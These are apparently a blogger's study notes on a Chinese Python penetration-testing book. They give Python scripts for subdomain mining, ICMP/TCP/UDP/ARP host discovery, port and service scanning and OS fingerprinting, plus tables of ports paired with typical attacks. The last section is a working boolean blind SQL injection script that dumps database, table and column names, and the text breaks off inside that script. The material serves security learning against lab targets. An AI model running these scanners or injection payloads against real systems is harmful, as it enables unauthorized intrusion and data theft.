title: Python安全攻防
author: bmth
tags:
  - 学习笔记
categories: []
img: 'https://img-blog.csdnimg.cn/20210304211248716.png'
date: 2020-12-21 21:23:00
---
这是我看《Python安全攻防 渗透测试实战指南》的一些笔记并且记录一些有用的脚本
## 信息收集
这里分享几个常用的网站:
[FOFA网络空间测绘系统](https://fofa.so/)
[云悉指纹|在线cms指纹识别平台](https://www.yunsee.cn)
[高精度IP地址查询-查IPIP](https://chaipip.com)
[高精度IP定位](https://www.opengps.cn/Data/IP/ipplus.aspx)
[Shodan](https://www.shodan.io)
[钟馗之眼](https://www.zoomeye.org)
[域名Whois查询](http://whois.chinaz.com)
[ThreatScan](https://scan.top15.cn/web/)
### 被动信息搜集
被动信息搜集主要是通过搜索引擎或者社交等方式对目标资产信息进行提取，包括IP查询、whois查询、子域名搜集等。进行被动信息搜集时不与目标产生交互，可以在不接触到目标系统的情况下挖掘目标信息。主要方法包括：DNS解析、子域名挖掘、邮件爬取等。
#### IP查询
```python
import socket
print("输入需要查询的域名：")
a = input()
ip = socket.gethostbyname(a)
print(ip)
```
![](https://img-blog.csdnimg.cn/20201222165840902.png)

#### Whois查询
需要安装python-whois模块，`pip install python-whois`
```python
from whois import whois
print("输入需要查询的域名：")
a = input()
data = whois(a)
print(data)
```
![](https://img-blog.csdnimg.cn/20201222172050184.png)

#### 子域名挖掘
通过Bing搜索引擎进行子域名挖掘
```python
#! /usr/bin/env python
# _*_  coding:utf-8 _*_
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import sys


def bing_search(site, pages):
    Subdomain = []
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
               'Accept': '*/*',
               'Accept-Language': 'en-US,en;q=0.5',
               'Accept-Encoding': 'gzip,deflate',
               'referer': "http://cn.bing.com/search?q=email+site%3abaidu.com&qs=n&sp=-1&pq=emailsite%3abaidu.com&first=2&FORM=PERE1"
               }
    for i in range(1,int(pages)+1):
        url = "https://cn.bing.com/search?q=site%3a"+site+"&go=Search&qs=ds&first="+ str((int(i)-1)*10) +"&FORM=PERE"
        conn = requests.session()
        conn.get('http://cn.bing.com', headers=headers)
        html = conn.get(url, stream=True, headers=headers, timeout=8)
        soup = BeautifulSoup(html.content, 'html.parser')
        job_bt = soup.findAll('h2')
        for i in job_bt:
            link = i.a.get('href')
            domain = str(urlparse(link).scheme + "://" + urlparse(link).netloc)
            if domain in Subdomain:
                pass
            else:
                Subdomain.append(domain)
                print(domain)

if __name__ == '__main__':
    # site=baidu.com
    if len(sys.argv) == 3:
        site = sys.argv[1]
        page = sys.argv[2]
    else:
        print ("usage: %s baidu.com 10" % sys.argv[0])
        sys.exit(-1)
    Subdomain = bing_search(site, page)
```
还可以使用站长工具：[子域名查询](http://tool.chinaz.com/subdomain/)

### 主动信息搜集
在内网中，好的信息搜索能力能够帮助开发者更快地拿到权限及达成目标
#### 基于ICMP的主机发现
ICMP(Internet Control Message Protocal,Internet报文协议)是TCP/IP的一种子协议，位于OSI7层网络模型中的网络层，其目的是用于在IP主机、路由器之间传递控制消息

可以使用ping命令来进行探测，这里学习一下python脚本，首先安装一下Scapy库：
`python3 -m pip install -i https://pypi.douban.com/simple --pre scapy[complete]`
>scapy用于发送ping请求和接收目标主机的应答数据，random用于产生随机字段，optparse用于生成命令参数形势

```python
#!/usr/bin/python
#coding:utf-8
from scapy.all import *
from random import randint
from optparse import OptionParser

def Scan(ip):
    ip_id = randint(1, 65535)
    icmp_id = randint(1, 65535)
    icmp_seq = randint(1, 65535)
    packet=IP(dst=ip,ttl=64,id=ip_id)/ICMP(id=icmp_id,seq=icmp_seq)/b'rootkit'
    result = sr1(packet, timeout=1, verbose=False)
    if result:
        for rcv in result:
            scan_ip = rcv[IP].src
            print(scan_ip + '--->' 'Host is up')
    else:
        print(ip + '--->' 'host is down')

def main():
    parser = OptionParser("Usage:%prog -i <target host> ")   # 输出帮助信息
    parser.add_option('-i',type='string',dest='IP',help='specify target host')   # 获取ip地址参数
    options,args = parser.parse_args()
    print("Scan report for " + options.IP + "\n")
    # 判断是单台主机还是多台主机
    # ip中存在-,说明是要扫描多台主机
    if '-' in options.IP:
    # 代码意思举例：192.168.1.1-120
    # 通过'-'进行分割，把192.168.1.1和120进行分离
    # 把192.168.1.1通过','进行分割,取最后一个数作为range函数的start,然后把120+1作为range函数的stop
    # 这样循环遍历出需要扫描的IP地址
        for i in range(int(options.IP.split('-')[0].split('.')[3]), int(options.IP.split('-')[1]) + 1):
            Scan(
            options.IP.split('.')[0] + '.' + options.IP.split('.')[1] + '.' + options.IP.split('.')[
                2] + '.' + str(i))
            time.sleep(0.2)
    else:
        Scan(options.IP)

    print("\nScan finished!....\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("interrupted by user, killing all threads...")
```
![](https://img-blog.csdnimg.cn/20201223123016191.png)
>还可以导入Nmap库函数，实现探测主机存活工具的编写。这里使用Nmap函数的-sn与-PE参数，-PE表示使用ICMP，-sn表示只测试该主机的状态。

先进行安装`pip3 install python-nmap`
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import nmap
import optparse

def NmapScan(targetIP):
	# 实例化PortScanner对象
	nm = nmap.PortScanner()
	try:
		# hosts为目标IP地址,argusments为Nmap的扫描参数
		# -sn:使用ping进行扫描
		# -PE:使用ICMP的 echo请求包(-PP:使用timestamp请求包 -PM:netmask请求包)
		result = nm.scan(hosts=targetIP, arguments='-sn -PE')
		# 对结果进行切片，提取主机状态信息
		state = result['scan'][targetIP]['status']['state']
		print("[{}] is [{}]".format(targetIP, state))
	except Exception  as e:
		pass


if __name__ == '__main__':
	parser = optparse.OptionParser('usage: python %prog -i ip \n\n'
                                    'Example: python %prog -i 192.168.1.1[192.168.1.1-100]\n')
	# 添加目标IP参数-i
	parser.add_option('-i','--ip',dest='targetIP',default='192.168.1.1',type='string',help='target ip address')
	options,args = parser.parse_args()
	# 判断是单台主机还是多台主机
	# ip中存在-,说明是要扫描多台主机
	if '-' in options.targetIP:
		# 代码意思举例：192.168.1.1-120
		# 通过'-'进行分割，把192.168.1.1和120进行分离
		# 把192.168.1.1通过','进行分割,取最后一个数作为range函数的start,然后把120+1作为range函数的stop
		# 这样循环遍历出需要扫描的IP地址
		for i in range(int(options.targetIP.split('-')[0].split('.')[3]),int(options.targetIP.split('-')[1])+1): 
			NmapScan(options.targetIP.split('.')[0] + '.' + options.targetIP.split('.')[1] + '.' + options.targetIP.split('.')[2] + '.' + str(i))
	else:	
		NmapScan(options.targetIP)
```
![](https://img-blog.csdnimg.cn/20201223130246715.png)
该方法具有一定缺陷，当网络设备，例如路由器、防火墙等对ICMP采取了屏蔽策略时，就会导致扫描结果不准确
#### 基于TCP、UDP的主机发现
TCP是一种面向连接的，可靠的传输通信协议，位于IP层之上，应用层之下的中间层。每一次建立连接都基于三次握手通信，终止一个连接也需要经过四次握手，建立完连接之后，才可以传输数据。
可参考文章：
[TCP三次握手详解-深入浅出(有图实例演示)](https://blog.csdn.net/jun2016425/article/details/81506353)
[TCP三次握手详解及面试题](https://blog.csdn.net/shuffle_ts/article/details/93778635)
>因此，我们可以利用TCP三次握手原理进行主机存活的探测。当向目标主机直接发送ACK数据包时，如果目标主机存活，就会返回一个RST数据包以终止这个不正常的TCP连接。也可以发送正常的SYN数据包，如果目标主机返回SYN/ACK或者RST数据包，也可以证明目标主机为存活状态。其工作原理主要依据目标主机响应数据包中flags字段，如果flags字段有值，则表示主机存活，该字段通常包括SYN、FIN、ACK、PSH、RST、URG六种类型。SYN表示建立连接，FIN表示关闭连接，ACK表示应答，PSH表示包含DATA数据传输，RST表示连接重置，URG表示紧急指针。

time模块主要用于产生延迟时间，optparse用于生成命令行参数，random模块用于生成随机的端口，scapy用于以TCP发送请求以及接收应答数据
```python
import os
import time
from optparse import OptionParser
from random import randint
from scapy.all import *


def Scan(ip):
    try:
        dport = random.randint(1, 65535)	#随机目的端口
        packet = IP(dst=ip)/TCP(flags="A",dport=dport)	#构造标志位为ACK的数据包
        response = sr1(packet,timeout=1.0, verbose=0)
        if response:
            if int(response[TCP].flags) == 4:		#判断响应包中是否存在RST标志位
                time.sleep(0.5)
                print(ip + ' ' + "is up")
            else:
                print(ip + ' ' + "is down")
        else:
            print(ip + ' ' + "is down")
    except:
        pass


def main():

    usage = "Usage: %prog -i <ip address>"	# 输出帮助信息
    parse = OptionParser(usage=usage)
    parse.add_option("-i", '--ip', type="string", dest="targetIP", help="specify the IP address")	# 获取网段地址
    options, args = parse.parse_args()	#实例化用户输入的参数
    if '-' in options.targetIP:
        # 代码意思举例：192.168.1.1-120
        # 通过'-'进行分割，把192.168.1.1和120进行分离
        # 把192.168.1.1通过','进行分割,取最后一个数作为range函数的start,然后把120+1作为range函数的stop
        # 这样循环遍历出需要扫描的IP地址
        for i in range(int(options.targetIP.split('-')[0].split('.')[3]), int(options.targetIP.split('-')[1]) + 1):
            Scan(options.targetIP.split('.')[0] + '.' + options.targetIP.split('.')[1] + '.' +
                     options.targetIP.split('.')[2] + '.' + str(i))
    else:
        Scan(options.targetIP)


if __name__ == '__main__':
    main()
```
![](https://img-blog.csdnimg.cn/20201223131607148.png)
>UDP(User Datagram Protocol，用户数据报协议)是一种利用IP提供面向无连接的网络通信服务。UDP会把应用程序发来的数据，在收到的一刻立即原样发送到网络上。即使在网络传输过程中出现丢包、顺序错乱等情况时，UDP也不会负责重新发送以及纠错。当向目标发送一个UDP数据包之后，目标是不会发回任何UDP数据包的。不过，如果目标主机处于活跃状态，但是目标端口是关闭状态时，会返回一个ICMP数据包，这个数据包的含义为unreachable。如果目标主机不处于活跃状态，这时是收不到任何响应数据的。

[TCP和UDP的区别](https://zhuanlan.zhihu.com/p/24860273)
time模块主要用于产生延迟时间，optparse用于生成命令行参数，random模块用于生成随机的端口，scapy用于以UDP发送请求以及接收应答数据
```python
#!/usr/bin/python
import os
import time
from optparse import OptionParser
from random import randint
from scapy.all import *


def Scan(ip):
    try:
        dport = random.randint(1, 65535)
        packet = IP(dst=ip)/UDP(dport=80)
        response = sr1(packet,timeout=1.0, verbose=0)
        if response:
            if int(response[IP].proto) == 1:
                time.sleep(0.5)
                print(ip + ' ' + "is up")
            else:
                print(ip + ' ' + "is down")
        else:
            print(ip + ' ' + "is down")
    except:
        pass


def main():

    usage = "Usage: %prog -i <ip address>"	# 输出帮助信息
    parse = OptionParser(usage=usage)
    parse.add_option("-i", '--ip', type="string", dest="targetIP", help="specify the IP address")	# 获取网段地址
    options, args = parse.parse_args()	#实例化用户输入的参数
    if '-' in options.targetIP:
        # 代码意思举例：192.168.1.1-120
        # 通过'-'进行分割，把192.168.1.1和120进行分离
        # 把192.168.1.1通过','进行分割,取最后一个数作为range函数的start,然后把120+1作为range函数的stop
        # 这样循环遍历出需要扫描的IP地址
        for i in range(int(options.targetIP.split('-')[0].split('.')[3]), int(options.targetIP.split('-')[1]) + 1):
            Scan(options.targetIP.split('.')[0] + '.' + options.targetIP.split('.')[1] + '.' +
                     options.targetIP.split('.')[2] + '.' + str(i))
    else:
        Scan(options.targetIP)


if __name__ == '__main__':
    main()
```
对于TCP、UDP主机发现，同样可以借助Nmap库来实现，需要用到Nmap的-sT和-PU两个参数

#### 基于ARP的主机发现
ARP协议(地址解析协议)属于数据链路层的协议，主要负责根据网络层地址(IP)来获取数据链路层地址(MAC)，以太网协议规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须知道目标主机的MAC地址。
[ARP（地址解析协议）](https://baike.baidu.com/item/ARP/609343)
当目标主机与我们处于同一以太网的时候，利用ARP进行主机发现是一个最好的选择。因为这种扫描方式快且精准
![](https://img-blog.csdnimg.cn/20201223154757338.png)
Ether中src表示源MAC地址，dst表示目的MAC地址。ARP中op代表消息类型，1为ARP请求，2为ARP响应，hwsrc和psrc表示源MAC地址和源IP地址，pdst表示目的的IP地址
需要使用sudo运行脚本
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import re
import optparse
from scapy.all import *

#取IP地址和MAC地址函数
def HostAddress(iface):
    #os.popen执行后返回执行结果
    ipData = os.popen('ifconfig '+iface)
    #对ipData进行类型转换，再用正则进行匹配
    dataLine = ipData.readlines()
    #re.search利用正则匹配返回第一个成功匹配的结果,存在结果则为true
    #取MAC地址
    if re.search('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w',str(dataLine)):
        #取出匹配的结果
        MAC = re.search('\w\w:\w\w:\w\w:\w\w:\w\w:\w\w',str(dataLine)).group(0)
    #取IP地址
    if re.search(r'((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)',str(dataLine)):
        IP = re.search(r'((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)',str(dataLine)).group(0)
    #将IP和MAC通过元组的形式返回
    addressInfo = (IP,MAC)
    return addressInfo

#ARP扫描函数
def ArpScan(iface='eth0'):
    #通过HostAddres返回的元组取出MAC地址
    mac = HostAddress(iface)[1]
    #取出本机IP地址
    ip = HostAddress(iface)[0]
    #对本机IP地址并进行分割作为依据元素，用于生成需要扫描的IP地址
    ipSplit = ip.split('.')
    #需要扫描的IP地址列表
    ipList = []
    #根据本机IP生成IP扫描范围
    for i in range(1,255):
        ipItem = ipSplit[0] + '.' + ipSplit[1] + '.' + ipSplit[2] + '.' + str(i)
        ipList.append(ipItem)
    '''
    发送ARP包
    因为要用到OSI二层和三层，所以要写成Ether/ARP。
    因为最底层用到了二层，所以要用srp()发包
    '''
    result = srp(Ether(src=mac,dst='FF:FF:FF:FF:FF:FF')/ARP(op=1,hwsrc=mac,hwdst='00:00:00:00:00:00',pdst=ipList),iface=iface,timeout=2,verbose=False)
    #读取result中的应答包和应答包内容
    resultAns = result[0].res
    #存活主机列表
    liveHost = []
    #number存回应包总数
    number = len(resultAns)
    print("=====================")
    print("    ARP 探测结果     ")
    print("本机IP地址:"  + ip)
    print("本机MAC地址:" + mac)
    print("=====================")
    for x in range(number):
        IP = resultAns[x][1][1].fields['psrc']
        MAC = resultAns[x][1][1].fields['hwsrc']
        liveHost.append([IP,MAC])
        print("IP:" + IP + "\n\n" + "MAC:" + MAC  )
        print("=====================")
    #把存活主机IP写入文件
    resultFile = open("result","w")
    for i in range(len(liveHost)):
        resultFile.write(liveHost[i][0] + "\n")

    resultFile.close()
if __name__ == '__main__':
    parser = optparse.OptionParser('usage: python %prog -i interfaces \n\n'
                                    'Example: python %prog -i eth0\n')
    #添加网卡参数 -i
    parser.add_option('-i','--iface',dest='iface',default='eth0',type='string',help='interfaces name')
    (options, args) = parser.parse_args()
    ArpScan(options.iface)
```
![](https://img-blog.csdnimg.cn/20201223164118989.png)

#### 端口探测
通过Python的Socket模块来编写一个简便的多线程端口扫描工具
```python
#!/usr/bin/python3
# -*- coding:utf-8 -*-

import sys
import socket
import optparse
import threading
import queue


# 端口扫描类,继承threading.Thread
class PortScaner(threading.Thread):
    # 需要传入 端口队列 目标IP 探测超时时间
    def __init__(self, portqueue, ip, timeout=3):
        threading.Thread.__init__(self)
        self._portqueue = portqueue
        self._ip = ip
        self._timeout = timeout

    def run(self):
        while True:
            # 判断端口队列是否为空
            if self._portqueue.empty():
                # 端口队列为空说明已经扫描完毕，跳出循环
                break
            # 从端口队列中取出端口，超时时间为1s
            port = self._portqueue.get(timeout=0.5)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self._timeout)
                result_code = s.connect_ex((self._ip, port))
                # sys.stdout.write("[%d]Scan\n" % port)
                # 若端口开放则会返回0
                if result_code == 0:
                    sys.stdout.write("[%d] OPEN\n" % port)
            except Exception as e:
                print(e)
            finally:
                s.close()

def StartScan(targetip, port, threadNum):
    # 端口列表
    portList = []
    portNumb = port
    # 判断是单个端口还是端口范围
    if '-' in port:
        for i in range(int(port.split('-')[0]), int(port.split('-')[1])+1):
            portList.append(i)
    else:
        portList.append(int(port))
    # 目标IP地址
    ip = targetip
    # 线程列表
    threads = []
    # 线程数量
    threadNumber = threadNum
    # 端口队列
    portQueue = queue.Queue()
    # 生成端口，加入到端口队列
    for port in portList:
        portQueue.put(port)
    for t in range(threadNumber):
        threads.append(PortScaner(portQueue, ip, timeout=3))
    # 启动线程
    for thread in threads:
        thread.start()
    # 阻塞线程
    for thread in threads:
        thread.join()


if __name__ == '__main__':
    parser = optparse.OptionParser('Example: python %prog -i 127.0.0.1 -p 80 \n      python %prog -i 127.0.0.1 -p 1-100\n')
    # 目标IP参数-i
    parser.add_option('-i', '--ip', dest='targetIP',default='127.0.0.1', type='string',help='target IP')
    # 添加端口参数-p
    parser.add_option('-p', '--port', dest='port', default='80', type='string', help='scann port')
    # 线程数量参数-t
    parser.add_option('-t', '--thread', dest='threadNum', default=100, type='int', help='scann thread number')
    (options, args) = parser.parse_args()
    StartScan(options.targetIP, options.port, options.threadNum)
    
```
这里使用Metasploitable2进行测试，首先得到了ip为192.168.239.131，运行脚本即可
![](https://img-blog.csdnimg.cn/20201223171143686.png)

#### 服务识别
文件共享服务端口：

|端口号|说明|作用|
|---|---|---|
|21/22/69|FTP/TFTP|允许匿名上传、下载、破解和嗅探攻击|
|2049|NFS服务|配置不当|
|139|Samba服务|破解、未授权访问、远程代码执行|
|389|LDAP(目录访问协议)|注入、允许匿名访问、使用弱口令|

远程连接服务端口：

|端口号|说明|作用|
|---|---|---|
|22|SSH远程连接|破解、SSH隧道及内网代理转发、文件传输|
|23|Telnet远程连接|破解、嗅探、弱口令|
|3389|Rdp远程桌面连接|Shift后门(需要Windows Server 2003以下的系统)、破解|
|5900|VNC|弱口令破解|
|5632|PyAnywhere服务|抓密码、代码执行|

Web应用服务端口：

|端口号|说明|作用|
|---|---|---|
|80/443/8080|常见Web服务端口|Web攻击、破解、服务器版本漏洞|
|7001/7002|WebLogic控制台|Java反序列化、弱口令|
|8080/8089|Jboss/Resin/Jetty/JenKins|反序列化、控制台弱口令|
|9090|WebSphere控制台|Java反序列化、弱口令|
|4848|GlassFish控制台|弱口令|
|1352|Lotus Domino邮件服务|弱口令、信息泄露、破解|
|10000|Webmin-Web控制面板|弱口令|

数据库服务端口：

|端口号|说明|作用|
|---|---|---|
|3306|MySQL|注入、提权、破解|
|1433|MSSQL|注入、提权、SA弱口令、破解|
|1521|Oracle数据库|TNS破解、注入、反弹shell|
|5432|PostgreSQL数据库|破解、注入、弱口令|
|27017/27018|MongoDB|破解、未授权访问|
|6379|Redis数据库|可尝试未授权访问、弱口令破解|
|5000|SysBase/DB2|破解、注入|

邮件服务端口：

|端口号|说明|作用|
|---|---|---|
|25|SMTP邮件服务|邮件伪造|
|110|POP3协议|破解、嗅探|
|143|IMAP协议|破解|

网络常见协议端口：

|端口号|说明|作用|
|---|---|---|
|53|DNS域名系统|允许区域传送、DNS劫持、缓存投毒、欺骗|
|63/68|DHCP服务|劫持、欺骗|
|161|SNMP协议|破解、搜集目标内网信息|

特殊服务端口：

|端口号|说明|作用|
|---|---|---|
|2181|Zookeeper服务|未授权访问|
|8069|Zabbix服务|远程执行、SQL注入|
|9200/9300|Elasticsearch|远程执行|
|11211|Memcache服务|未授权访问|
|512/513/514|Linux Rexec服务|破解、Rlogin登录|
|873|Rsync服务|匿名访问、文件上传|
|3690|SVN服务|SVN泄露、未授权访问|
|50000|SAP Management Console|远程执行|

可以向目标开放的端口发送探针数据包，根据目标主机返回的banner信息与存储总结的banner信息进行对比，进而确定运行的服务类型。SIGNS为指纹库，用于对目标主机返回的banner信息进行匹配
```python
#!/usr/bin/python3.7
#!coding:utf-8
from optparse import OptionParser
import time
import socket
import os
import re

SIGNS = (
    # 协议 | 版本 | 关键字
    b'FTP|FTP|^220.*FTP',
    b'MySQL|MySQL|mysql_native_password',
    b'oracle-https|^220- ora',
    b'Telnet|Telnet|Telnet',
    b'Telnet|Telnet|^\r\n%connection closed by remote host!\x00$',
    b'VNC|VNC|^RFB',
    b'IMAP|IMAP|^\* OK.*?IMAP',
    b'POP|POP|^\+OK.*?',
    b'SMTP|SMTP|^220.*?SMTP',
    b'Kangle|Kangle|HTTP.*kangle',
    b'SMTP|SMTP|^554 SMTP',
    b'SSH|SSH|^SSH-',
    b'HTTPS|HTTPS|Location: https',
    b'HTTP|HTTP|HTTP/1.1',
    b'HTTP|HTTP|HTTP/1.0',
)
def regex(response, port):
    text = ""
    if re.search(b'<title>502 Bad Gateway', response):
        proto = {"Service failed to access!!"}
    for pattern in SIGNS:
        pattern = pattern.split(b'|')
        if re.search(pattern[-1], response, re.IGNORECASE):
            proto = "["+port+"]" + " open " + pattern[1].decode()
            break
        else:
            proto = "["+port+"]" + " open " + "Unrecognized"
    print(proto)

def request(ip,port):
    response = ''
    PROBE = 'GET / HTTP/1.0\r\n\r\n'
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    result = sock.connect_ex((ip, int(port)))
    if result == 0:
        try:
            sock.sendall(PROBE.encode())
            response = sock.recv(256)
            if response:
                regex(response, port)
        except ConnectionResetError:
            pass
    else:
        pass
    sock.close()

def main():
    parser = OptionParser("Usage:%prog -i <target host> ")   # 输出帮助信息
    parser.add_option('-i',type='string',dest='IP',help='specify target host')   # 获取ip地址参数
    parser.add_option('-p', type='string', dest='PORT', help='specify target host')  # 获取ip地址参数
    options,args = parser.parse_args()
    ip = options.IP
    port = options.PORT
    print("Scan report for "+ip+"\n")
    for line in port.split(','):
        request(ip,line)
        time.sleep(0.2)
    print("\nScan finished!....\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("interrupted by user, killing all threads...")
```
![](https://img-blog.csdnimg.cn/20201223175201587.png)

#### 系统识别
>主机识别的技术原理：Windows操作系统与Linux操作系统的TCP/IP实现方式并不相同，导致两种系统对特定格式的数据包会有不同的响应结果，包括响应数据包的内容、响应时间等，形成了操作系统的指纹。通常情况下，可在对目标主机进行ping操作后，依据其返回的TTL值对系统类型进行判断，Windows系统的TTL起始值为128，Linux系统的TTL起始值为64，且每经过一跳路由，TTL值减1。

Windows的TTL返回值：
![](https://img-blog.csdnimg.cn/20201224230707970.png)
Linux的TTL返回值：
![](https://img-blog.csdnimg.cn/20201224203632315.png)
optparse用于生成命令行参数；os用于执行系统命令；re为正则表达式模块，用于匹配返回的TTL的值
```python
#!/usr/bin/python3.7
#!coding:utf-8
from optparse import OptionParser
import os
import re

def ttl_scan(ip):
    ttlstrmatch = re.compile(r'ttl=\d+')
    ttlnummatch = re.compile(r'\d+')
    result = os.popen("ping -c 1 "+ip)
    res = result.read()
    for line in res.splitlines():
        result = ttlstrmatch.findall(line)
        if result:
            ttl = ttlnummatch.findall(result[0])
            if int(ttl[0]) <= 64:  # 判断目标主机响应包中TTL值是否小于等于64
                print("%s  is Linux/Unix"%ip)  # 是的话就为linux/Unix
            else:
                print("%s is Windwows"%ip)  # 反之就是Windows
        else:
            pass

def main():
    parser = OptionParser("Usage:%prog -i <target host> ")   # 输出帮助信息
    parser.add_option('-i',type='string',dest='IP',help='specify target host')   # 获取ip地址参数
    options,args = parser.parse_args()
    ip = options.IP
    ttl_scan(ip)

if __name__ == "__main__":
    main()
```
也可以借助nmap库来实现操作系统类型识别的功能，通过Nmap的-O参数对目标主机操作进行系统识别
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import nmap
import optparse


def NmapScan(targetIP):
	# 实例化PortScanner对象
	nm = nmap.PortScanner()
	try:
		# hosts为目标IP地址,argusments为Nmap的扫描参数(-O为进行操作系统探测)
		result = nm.scan(hosts=targetIP, arguments='-O')
		# 对结果进行切片，提取操作系统相关的信息
		os = result["scan"][targetIP]['osmatch'][0]['name']
		print("="*20)
		print("ip:{} \nos:{}".format(targetIP, os))
		print("="*20)
	except Exception  as e:
		print(e)


if __name__ == '__main__':
	parser = optparse.OptionParser('usage: python %prog -i ip \n\n'
                                    'Example: python %prog -i 192.168.1.1\n')
	# 添加目标IP参数-i
	parser.add_option('-i','--ip',dest='targetIP',default='192.168.1.1',type='string',help='target ip address')
	options,args = parser.parse_args()
	# 将IP参数传递给NmapScan函数
	NmapScan(options.targetIP)
```
![](https://img-blog.csdnimg.cn/20201224232926110.png)

## 漏洞检测与防御
这里就记录sql注入吧，其实sql盲注脚本我也收集过的：[sql注入脚本](https://www.cnblogs.com/bmth/p/13583833.html)
### SQL盲注漏洞
~~原理就懒得废话了~~
基于布尔型SQL盲注检测：
```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import optparse

# 存放数据库名变量
DBName = ""
# 存放数据库表变量
DBTables = []
# 存放数据库字段变量
DBColumns = []
# 存放数据字典变量,键为字段名，值为字段数据列表
DBData = {}
# 若页面返回真，则会出现You are in...........
flag = "You are in..........."

# 设置重连次数以及将连接改为短连接
# 防止因为HTTP连接数过多导致的 Max retries exceeded with url
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False


# 盲注主函数
def StartSqli(url):
	GetDBName(url)
	print("[+]当前数据库名:{0}".format(DBName))
	GetDBTables(url,DBName)
	print("[+]数据库{0}的表如下:".format(DBName))
	for item in range(len(DBTables)):
		print("(" + str(item + 1) + ")" + DBTables[item])
	tableIndex = int(input("[*]请输入要查看表的序号:")) - 1
	GetDBColumns(url,DBName,DBTables[tableIndex])
	while True:
		print("[+]数据表{0}的字段如下:".format(DBTables[tableIndex]))
		for item in range(len(DBColumns)):
			print("(" + str(item + 1) + ")" + DBColumns[item])
		columnIndex = int(input("[*]请输入要查看字段的序号(输入0退出):"))-1
		if(columnIndex == -1):
			break
		else:
			GetDBData(url, DBTables[tableIndex], DBColumns[columnIndex])


# 获取数据库名函数
def GetDBName(url):
	# 引用全局变量DBName,用来存放网页当前使用的数据库名
	global DBName
	print("[-]开始获取数据库名长度")
	# 保存数据库名长度变量
	DBNameLen = 0
	# 用于检查数据库名长度的payload
	payload = "' and if(length(database())={0},1,0) %23"
	# 把URL和payload进行拼接得到最终的请求URL
	targetUrl = url + payload
	# 用for循环来遍历请求，得到数据库名长度
	for DBNameLen in range(1, 99):
		# 对payload中的参数进行赋值猜解
		res = conn.get(targetUrl.format(DBNameLen))
		# 判断flag是否在返回的页面中
		if flag in res.content.decode("utf-8"):
			print("[+]数据库名长度:" + str(DBNameLen))
			break
	print("[-]开始获取数据库名")
	payload = "' and if(ascii(substr(database(),{0},1))={1},1,0) %23"
	targetUrl = url + payload
	# a表示substr()函数的截取起始位置
	for a in range(1, DBNameLen+1):
		# b表示33~127位ASCII中可显示字符
		for b in range(33, 128):
			res = conn.get(targetUrl.format(a,b))
			if flag in res.content.decode("utf-8"):
				DBName += chr(b)
				print("[-]"+ DBName)
				break


#获取数据库表函数
def GetDBTables(url, dbname):
	global DBTables
	#存放数据库表数量的变量
	DBTableCount = 0
	print("[-]开始获取{0}数据库表数量:".format(dbname))
	#获取数据库表数量的payload
	payload = "' and if((select count(*)table_name from information_schema.tables where table_schema='{0}')={1},1,0) %23"
	targetUrl = url + payload
	#开始遍历获取数据库表的数量
	for DBTableCount in range(1, 99):
		res = conn.get(targetUrl.format(dbname, DBTableCount))
		if flag in res.content.decode("utf-8"):
			print("[+]{0}数据库的表数量为:{1}".format(dbname, DBTableCount))
			break
	print("[-]开始获取{0}数据库的表".format(dbname))
	# 遍历表名时临时存放表名长度变量
	tableLen = 0
	# a表示当前正在获取表的索引
	for a in range(0,DBTableCount):
		print("[-]正在获取第{0}个表名".format(a+1))
		# 先获取当前表名的长度
		for tableLen in range(1, 99):
			payload = "' and if((select LENGTH(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},1,0) %23"
			targetUrl = url + payload
			res = conn.get(targetUrl.format(dbname, a, tableLen))
			if flag in res.content.decode("utf-8"):
				break
		# 开始获取表名
		# 临时存放当前表名的变量
		table = ""
		# b表示当前表名猜解的位置
		for b in range(1, tableLen+1):
			payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},1,0) %23"
			targetUrl = url + payload
			# c表示33~127位ASCII中可显示字符
			for c in range(33, 128):
				res = conn.get(targetUrl.format(dbname, a, b, c))
				if flag in res.content.decode("utf-8"):
					table += chr(c)
					print(table)
					break
		#把获取到的名加入到DBTables
		DBTables.append(table)
		#清空table，用来继续获取下一个表名
		table = ""


# 获取数据库表的字段函数
def GetDBColumns(url, dbname, dbtable):
	global DBColumns
	# 存放字段数量的变量
	DBColumnCount = 0
	print("[-]开始获取{0}数据表的字段数:".format(dbtable))
	for DBColumnCount in range(99):
		payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},1,0) %23"
		targetUrl = url + payload
		res = conn.get(targetUrl.format(dbname, dbtable, DBColumnCount))
		if flag in res.content.decode("utf-8"):
			print("[-]{0}数据表的字段数为:{1}".format(dbtable, DBColumnCount))
			break
	# 开始获取字段的名称
	# 保存字段名的临时变量
	column = ""
	# a表示当前获取字段的索引
	for a in range(0, DBColumnCount):
		print("[-]正在获取第{0}个字段名".format(a+1))
		# 先获取字段的长度
		for columnLen in range(99):
			payload = "' and if((select length(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},1,0) %23"
			targetUrl = url + payload
			res = conn.get(targetUrl.format(dbname, dbtable, a, columnLen))
			if flag in res.content.decode("utf-8"):
				break
		# b表示当前字段名猜解的位置
		for b in range(1, columnLen+1):
			payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},1,0) %23"
			targetUrl = url + payload
			# c表示33~127位ASCII中可显示字符
			for c in range(33, 128):
				res = conn.get(targetUrl.format(dbname, dbtable, a, b, c))
